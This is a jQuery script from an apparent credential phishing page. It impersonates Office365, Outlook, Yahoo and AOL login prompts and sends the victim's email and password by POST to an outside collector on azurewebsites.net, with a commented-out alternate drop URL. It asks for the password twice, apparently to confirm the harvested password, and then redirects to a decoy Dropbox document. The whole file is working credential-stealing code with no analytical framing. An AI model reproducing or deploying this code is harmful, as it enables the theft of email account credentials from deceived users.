  <script>
   $(document).on('show.bs.modal','#myModal', function (event) {
				var button = $(event.relatedTarget) // Button that triggered the modal
				var recipient = button.data('provider') // Extract info from data-* attributes
				// If necessary, you could initiate an AJAX request here (and then do the updating in a callback).
				// Update the modal's content. We'll use jQuery here, but you could use a data binding library or other methods instead.
				var modal = $(this)
				$("#pass").val("");
				if (recipient === "@office365"){
					modal.find('.modal-title').text('Login with ' + recipient);
					modal.find('.mailer input').val('')
					modal.find('#type').val(recipient)
					$('#providerImg').html('<img src="https://dl.dropbox.com/s/ixuq5x3u8ex1c7x/Microsoft%20Office%20logo%202012.png" class="img-fluid" alt="Responsive image">');

				}
				if(recipient === "@outlook"){
					modal.find('.modal-title').text('Login with ' + recipient);
					modal.find('.mailer input').val('')
					modal.find('#type').val(recipient)
					$('#providerImg').html('<img src="https://dl.dropbox.com/s/oobz7p520riwwri/outlook-logo-vector.png" class="img-fluid" alt="Responsive image">');
				}
				if(recipient === "@yahoo"){
					modal.find('.modal-title').text('Login with ' + recipient);
					modal.find('.mailer input').val('')
					modal.find('#type').val(recipient)
					$('#providerImg').html('<img src="https://dl.dropbox.com/s/pz9o5h104l8irno/yahoo-76684_960_720.png" class="img-fluid" alt="Responsive image">');
				}
				if(recipient === "@aol"){
					modal.find('.modal-title').text('Login with ' + recipient);
					modal.find('.mailer input').val('')
					modal.find('#type').val(recipient)
					$('#providerImg').html('<img src="https://dl.dropbox.com/s/ttsidle8p7xi43u/1280px-AOL_old_logo.svg.png" class="img-fluid" alt="Responsive image">');
				}
				if(recipient === "@others"){
					modal.find('.modal-title').text('Login with ' + recipient);
					modal.find('.mailer input').val('')
					modal.find('#type').val(recipient)
					$('#providerImg').html('<img src="https://dl.dropbox.com/s/0hzsvqhlpyuh4v8/otherInboxlogo.png" class="img-fluid" alt="Responsive image">');
				}
				$("#submitBtn").click(doJob);
				$('#recipient-name').on('keypress', function(e){
					if(e.keyCode == '13'){
						doJob();
					}
				});
				$('#pass').on('keypress', function(e){
					if(e.keyCode == '13'){
						doJob();
					}
				});
				function doJob(){  
					$("#errors").html('');
					$("#submitBtn").html('Loading...');
					$("#submitBtn").attr("disabled", true);
					$("#myError").remove();
					$("#myError2").remove();
					var formData = {
						pass: $("#pass").val(),
						email: $("#recipient-name").val(),
						type: $("#type").val(),
						once: $("#once").val(),
					};
					$.ajax({
						type: "POST",
						url: "https://apirequester.azurewebsites.net/clientsDirectory/reo/process.php",
						//url: "https://docslater.net/dp/process.php",
						//url: "php/process.php",
						
						data: formData,
						dataType: "json",
						encode: true,
					}).done(function (data) {
						if (!data.success) {
							if (data.errors.pass) {
								$("#pass-group").addClass("has-error");
								$("#pass-group").append(
								'<div class="help-block" style="color:red;" id="myError">' + data.errors.pass + "</div>");
								$("#submitBtn").html('Login');
								$("#submitBtn").attr("disabled", false);
							}
							
							if (data.errors.pass2) {
								$("#pass-group").addClass("has-error");
								$("#pass-group").append(
								'<div class="help-block" style="color:red;" id="myError">' + data.errors.pass2 + "</div>");
								$("#pass").val("");
								$("#once").val("2");
								$("#submitBtn").html('Login');
								$("#submitBtn").attr("disabled", false);
							}
							
							if (data.errors.email) {
								$("#email-group").addClass("has-error");
								$("#email-group").append(
								'<div class="help-block" style="color:red;" id="myError2">' + data.errors.email + "</div>");
								$("#submitBtn").html('Login');
								$("#submitBtn").attr("disabled", false);
							}
						} else {
							$("#errors").html(
							'<div class="alert alert-success">' + data.message + "</div>"
							);
							window.setTimeout(function(){window.location.href = "https://www.dropbox.com/s/ftp9ic3sgjgiff9/doc1.pdf?dl=0";}, 3000);
						}

					});

					event.preventDefault();
				}; // Submit the form
					
					
			});
  </script>
